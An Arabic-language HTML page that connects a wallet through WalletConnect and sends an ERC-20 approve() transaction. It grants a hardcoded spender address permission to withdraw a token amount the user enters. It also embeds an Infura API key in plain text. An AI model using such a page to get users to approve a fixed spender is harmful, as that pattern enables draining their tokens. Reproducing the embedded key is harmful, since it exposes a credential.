<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>تفعيل Approve عبر WalletConnect</title>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
  <script src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js" type="application/javascript"></script>
</head>
<body>
  <h2>صفحة تفعيل Approve</h2>

  <label>عنوان توكن ERC-20: </label>
  <input type="text" id="tokenAddress" placeholder="أدخل عنوان التوكن هنا" size="50" />
  <br /><br />

  <label>المبلغ للموافقة (Approve): </label>
  <input type="text" id="approveAmount" placeholder="1000" value="1000" />
  <br /><br />

  <button id="approveBtn">اعمل Approve</button>

  <p id="status"></p>

  <script>
    const provider = new WalletConnectProvider.default({
      rpc: {
        1: "https://mainnet.infura.io/v3/f062246635234234a265dffcceba5e69" // Infura API Key
      },
    });

    async function doApprove() {
      const statusEl = document.getElementById("status");
      const tokenAddress = document.getElementById("tokenAddress").value.trim();
      const amountStr = document.getElementById("approveAmount").value.trim();

      if (!ethers.utils.isAddress(tokenAddress)) {
        statusEl.textContent = "الرجاء إدخال عنوان توكن صحيح.";
        return;
      }
      if (!amountStr || isNaN(amountStr) || Number(amountStr) <= 0) {
        statusEl.textContent = "الرجاء إدخال مبلغ صحيح للموافقة.";
        return;
      }

      try {
        // إنشاء اتصال محفظة عبر WalletConnect (يفتح مسح QR أو يفتح التطبيق على الموبايل مباشرة)
        await provider.enable();

        const web3Provider = new ethers.providers.Web3Provider(provider);
        const signer = web3Provider.getSigner();

        const erc20Abi = [
          "function decimals() view returns (uint8)",
          "function approve(address spender, uint256 amount) returns (bool)"
        ];

        const contract = new ethers.Contract(tokenAddress, erc20Abi, signer);

        // العنوان اللي هتدي له صلاحية السحب (غيره حسب المطلوب)
        const spenderAddress = "0x2D7727275987dD62a6e5a3bd15CA8CFE9371ff5c";

        const decimals = await contract.decimals();
        const amount = ethers.utils.parseUnits(amountStr, decimals);

        statusEl.textContent = "جارٍ إرسال طلب الموافقة...";

        const tx = await contract.approve(spenderAddress, amount);

        statusEl.textContent = "تم إرسال المعاملة، في انتظار التوثيق...";

        await tx.wait();

        statusEl.textContent = `تم الموافقة بنجاح! Hash: ${tx.hash}`;

        // أغلق الاتصال بعد النجاح
        await provider.disconnect();

      } catch (error) {
        console.error(error);
        if (error.code === 4001) {
          statusEl.textContent = "تم رفض المعاملة من قبل المستخدم.";
        } else {
          statusEl.textContent = "حدث خطأ: " + (error.message || error);
        }
      }
    }

    document.getElementById("approveBtn").addEventListener("click", doApprove);
  </script>
</body>
</html>
